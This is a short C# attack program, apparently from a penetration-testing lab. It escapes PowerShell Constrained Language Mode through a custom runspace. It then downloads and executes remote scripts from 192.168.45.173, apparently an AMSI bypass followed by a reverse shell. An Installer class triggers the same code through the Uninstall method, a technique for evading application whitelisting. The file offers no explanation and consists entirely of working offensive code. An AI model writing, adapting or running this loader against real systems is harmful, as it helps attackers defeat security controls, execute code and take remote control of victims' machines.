using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;



namespace PsBypassCostraintLanguageMode
{
    public class Program
    {
        public static void Main()
        {


            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("iex(iwr http://192.168.45.173/amsi.txt -UseBasicParsing)");


            Runspace runspace2 = RunspaceFactory.CreateRunspace();
            runspace2.Open();
            RunspaceInvoke runSpaceInvoker2 = new RunspaceInvoke(runspace2);
            runSpaceInvoker.Invoke("iex(iwr http://192.168.45.173/rev.txt -UseBasicParsing)");

        }
    }

        [System.ComponentModel.RunInstaller(true)]
        public class Loader : System.Configuration.Install.Installer
        {

            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                base.Uninstall(savedState);

            Program.Main();
            }
        }

    }
